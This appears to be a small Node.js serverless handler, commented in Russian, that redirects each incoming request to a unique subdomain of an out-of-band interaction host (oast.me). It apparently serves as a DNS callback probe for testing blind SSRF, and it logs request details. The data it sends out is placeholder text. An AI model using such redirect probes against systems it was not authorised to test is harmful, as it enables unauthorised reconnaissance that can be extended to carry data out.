module.exports = (req, res) => {

    const yourDomain = 'd4tt7rkgtqkhfd7qiebggcx7ozotnwx5g.oast.me';
    
    // Генерируем уникальный ID для этого запроса
    const requestId = Math.random().toString(36).substring(2, 10);
    
    const testType = 'dnsproof';
    const testData = 'test';
 
    const targetUrl = `http://${testType}.${testData}.${requestId}.${yourDomain}/`;
 
    console.log('🔍 Время запроса:', new Date().toISOString());
    console.log('User-Agent:', req.headers['user-agent'] || 'Не указан');
    console.log('Путь:', req.url);
    console.log('🎯 DNS-пейлоад:', targetUrl);
    console.log('📋 Расшифровка пейлоада:');
    console.log('  - Тип теста:', testType);
    console.log('  - Данные:', testData);
    console.log('  - Request ID:', requestId);
    console.log('  - Твой домен:', yourDomain);
    
    res.writeHead(302, {
        'Location': targetUrl,
        'Cache-Control': 'no-store, no-cache, max-age=0'
    });
    res.end();
};
